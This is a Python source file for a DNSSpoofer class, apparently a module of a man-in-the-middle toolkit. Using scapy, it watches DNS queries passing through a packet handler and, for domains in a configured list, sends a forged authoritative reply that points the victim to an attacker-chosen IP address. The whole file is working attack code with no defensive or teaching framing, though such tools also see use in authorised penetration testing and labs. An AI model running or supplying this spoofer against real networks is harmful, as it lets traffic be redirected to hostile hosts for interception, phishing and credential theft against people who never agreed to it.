from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
import logging


class DNSSpoofer:
    def __init__(self, interface, target_ip, dns_mapping, packet_handler):
        
        self.interface = interface
        self.target_ip = target_ip
        self.packet_handler = packet_handler
        self.dns_map = self._parse_mapping(dns_mapping)
        self.logger = logging.getLogger("DNSSpoofer")

    def _parse_mapping(self, raw_mapping):
        
        mapping = {}
        for entry in raw_mapping.split(','):
            if ':' in entry:
                domain, ip = entry.split(':')
                mapping[domain.strip().lower()] = ip.strip()
        return mapping

    def start(self):
        
        self.logger.info("DNS Spoofer ready to eat.")
        self.packet_handler.add_filter(self._process_packet)

    def stop(self):
        
        self.logger.info("DNS Spoofer ate enough, it's full.")

    def _process_packet(self, packet):
        
        if packet.haslayer(DNS) and packet[DNS].qr == 0 and packet.haslayer(DNSQR):
            qname = packet[DNSQR].qname.decode().rstrip('.').lower()
            if qname in self.dns_map:
                spoofed_ip = self.dns_map[qname]
                self.logger.info(f"[*] Spoofing {qname} -> {spoofed_ip}")

                # Create a spoofed DNS response
                spoofed = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=53) / \
                          DNS(
                              id=packet[DNS].id,
                              qr=1,
                              aa=1,
                              qd=packet[DNS].qd,
                              an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=spoofed_ip)
                          )

                # Send the spoofed response
                send(spoofed, iface=self.interface, verbose=0)